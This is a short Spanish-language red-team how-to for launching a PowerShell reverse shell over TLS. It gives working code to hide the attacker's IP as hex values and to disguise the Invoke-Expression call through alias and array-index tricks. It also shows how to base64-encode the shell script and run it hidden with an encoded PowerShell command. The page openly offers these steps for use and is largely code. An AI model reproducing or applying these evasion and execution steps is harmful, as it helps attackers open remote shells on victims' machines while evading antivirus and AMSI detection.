## **TCP Reverse Shell mediante TLS en Powershell**

Todos los agradecimientos a estos dos enlaces, esto no es más que casi un copia y pega:

https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/

https://github.com/3v4Si0N/HTTP-revshell

**1.- Ofuscar la IP**

Básicamente se trata de crear los valores en hexadecimal:

```
printf "%x,%x,%x,%x\n" 192 168 11 34
c0,a8,b,22
```

```powershell
$px = "c0","a8","b","22"
$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
```

**2.- Ofuscar la cadena IEX**

Establecemos un alias con los valores de una cadena aleatoria, extrayendo la cadena con los índices del array:

```powershell
$x = "new-exercise"
Set-alias $x  ($x[$true-4] + ($x[[byte]("0x" + "FF") - 263]) + $x[[byte]("0x" + "ba") - 193]) .'
```
Aquí otro método que he visto, pero la idea es utilizar el tuyo propio:
```powershell
[array]$shurmano = "I","n","t","E","r","n","e","X" ;
set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
```

**3.- Pasar el script de powershell a base64**
```
cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
```

**4.- Ejecutarlo desde consola PS **
```
powershell -noP -sta -w 1 -enc ENC64SCRIPT
```

